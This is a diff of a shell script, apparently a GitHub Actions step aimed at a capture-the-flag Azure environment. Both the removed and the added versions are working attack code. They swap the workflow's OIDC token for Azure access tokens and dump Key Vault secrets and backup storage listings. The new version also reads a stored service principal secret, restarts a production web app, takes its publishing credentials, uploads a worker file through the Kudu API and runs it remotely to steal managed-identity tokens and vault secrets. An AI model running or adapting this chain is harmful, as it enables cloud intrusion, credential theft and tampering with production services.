@@ -1,45 +1,27 @@
-#!/bin/bash
-set -e
-TENANT_ID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
-CLIENT_ID="${AZURE_CLIENT_ID}"
-SUB_ID="${AZURE_SUBSCRIPTION_ID}"
-
-echo "CTX repo=${GITHUB_REPOSITORY} event=${GITHUB_EVENT_NAME}"
-
-# Get GitHub OIDC token
-OIDC_TOKEN=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")
-OIDC_LEN=${#OIDC_TOKEN}
-echo "oidc_len=${OIDC_LEN}"
-
-# Exchange for ARM token
-ARM_RESP=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${CLIENT_ID}&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${OIDC_TOKEN}&assertion=${OIDC_TOKEN}&scope=https://management.azure.com/.default&federated_token=${OIDC_TOKEN}")
-ARM_TOKEN=$(echo "$ARM_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
-
-# Exchange for KV vault token
-KV_RESP=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${CLIENT_ID}&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${OIDC_TOKEN}&assertion=${OIDC_TOKEN}&scope=https://vault.azure.net/.default&federated_token=${OIDC_TOKEN}")
-KV_TOKEN=$(echo "$KV_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
-KV_LEN=${#KV_TOKEN}
-echo "kv_len=${KV_LEN}"
-
-# Try KV sec
-echo "=== KV SEC LIST ==="
-curl -s -H "Authorization: Bearer ${KV_TOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(s['id']) for s in d.get('value',[])] or print(json.dumps(d)[:200])"
-
-echo "=== KV SEC SPECIFIC SECRETS ==="
-for name in flag tbl-flag ctf-flag df26-flag platform-flag backup-key data-export-key; do
-  RESULT=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${KV_TOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/${name}?api-version=7.4")
-  if [ "$RESULT" = "200" ]; then
-    VALUE=$(curl -s -H "Authorization: Bearer ${KV_TOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/${name}?api-version=7.4" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")
-    echo "FOUND: ${name} = ${VALUE}"
-  else
-    echo "  ${name}: ${RESULT}"
-  fi
-done
-
-# Try backup storage with ARM token
-echo "=== BACKUP STORAGE WITH ARM TOKEN ==="
-STOR_RESP=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${CLIENT_ID}&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${OIDC_TOKEN}&assertion=${OIDC_TOKEN}&scope=https://storage.azure.com/.default&federated_token=${OIDC_TOKEN}")
-STOR_TOKEN=$(echo "$STOR_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
-curl -s -H "Authorization: Bearer ${STOR_TOKEN}" -H "x-ms-version: 2020-08-04" "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | python3 -c "import sys; print(sys.stdin.read()[:500])"
-
-echo "END"
+#!/usr/bin/env bash
+set +e
+python3 - <<'PY'
+import base64,json,os,time,urllib.parse,urllib.request,urllib.error
+TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; V='https://kv-tbl-prod-x3euoz.vault.azure.net'; APP='app-tbl-reporting-prod'; RG='rg-tbl-reporting-prod-eus'; ARM='https://management.azure.com'
+def rq(u,m='GET',d=None,h=None,t=30):
+ try:
+  x=urllib.request.urlopen(urllib.request.Request(u,data=d,method=m,headers=h or {}),timeout=t); return x.status,x.read()
+ except urllib.error.HTTPError as e:return e.code,e.read()
+ except Exception as e:return 0,str(e).encode()
+def jq(u,m='GET',o=None,tok='',t=30):
+ h={'Content-Type':'application/json'}
+ if tok:h['Authorization']='Bearer '+tok
+ s,b=rq(u,m,json.dumps(o).encode() if o is not None else None,h,t)
+ try:return s,json.loads(b.decode())
+ except:return s,{'raw':b.decode(errors='replace')}
+ou=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL','')+'&audience=api%3A%2F%2FAzureADTokenExchange'; s,b=rq(ou,h={'Authorization':'Bearer '+os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')}); oid=json.loads(b.decode()).get('value','') if s==200 else ''
+s,d=jq(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token','POST',{'client_id':CID,'grant_type':'client_credentials','scope':'https://vault.azure.net/.default','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oid}); vt=d.get('access_token',''); print('vault',len(vt),flush=True)
+s,d=jq(V+'/secrets/reporting-service-principal?api-version=7.4',tok=vt); sp=json.loads(d.get('value','{}')) if d.get('value') else {}
+s,d=jq(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token','POST',{'client_id':sp.get('appId',''),'grant_type':'client_credentials','client_secret':sp.get('clientSecret',''),'scope':'https://management.azure.com/.default'}); at=d.get('access_token',''); print('arm',len(at),flush=True)
+u=f'{ARM}/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/{APP}/restart?api-version=2023-01-01'; s,b=rq(u,'POST',b'',{'Authorization':'Bearer '+at},40); print('restart',s,b[:200],flush=True); time.sleep(12)
+u=f'{ARM}/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/{APP}/config/publishingcredentials/list?api-version=2023-01-01'; s,d=jq(u,'POST',{},at,40); p=d.get('properties',{}); ku=p.get('publishingUserName',''); kp=p.get('publishingPassword',''); print('pub',s,bool(ku),len(kp),flush=True)
+if not ku or not kp: raise SystemExit
+worker='''import os,json,urllib.parse,urllib.request,urllib.error\n+IE=os.environ.get("IDENTITY_ENDPOINT","http://169.254.131.3:8081/msi/token"); IH=os.environ.get("IDENTITY_HEADER","")\n+def g(u,h={}):\n+ try:\n+  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=20); return r.status,r.read().decode(errors="replace")\n+ except urllib.error.HTTPError as e:return e.code,e.read().decode(errors="replace")\n+ except Exception as e:return 0,str(e)\n+q=IE+"?resource="+urllib.parse.quote("https://vault.azure.net",safe="")+"&api-version=2019-08-01&client_id=7a85156a-01c4-4e61-8472-40a92107159b"; s,b=g(q,{"X-IDENTITY-HEADER":IH}); print("IDENTITY",s,b[:500])\n+try:t=json.loads(b)["access_token"]\n+except:t=""\n+for n in ["flag","tbl-flag","config-storage-connection","storage-connection","internal-config"]:\n+ s,b=g("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/"+n+"?api-version=7.4",{"Authorization":"Bearer "+t}); print("SECRET",n,s,b)\n+'''
+a=base64.b64encode((ku+':'+kp).encode()).decode(); u=f'https://{APP}.scm.azurewebsites.net/api/vfs/site/wwwroot/readflag.py'; s,b=rq(u,'PUT',worker.encode(),{'Authorization':'Basic '+a,'If-Match':'*'},40); print('vfs',s,b[:200],flush=True)
+cmd=json.dumps({'command':'python3 /home/site/wwwroot/readflag.py','dir':'site/wwwroot'}).encode(); s,b=rq(f'https://{APP}.scm.azurewebsites.net/api/command','POST',cmd,{'Authorization':'Basic '+a,'Content-Type':'application/json'},60); print('command',s,b.decode(errors='replace'),flush=True)
+PY
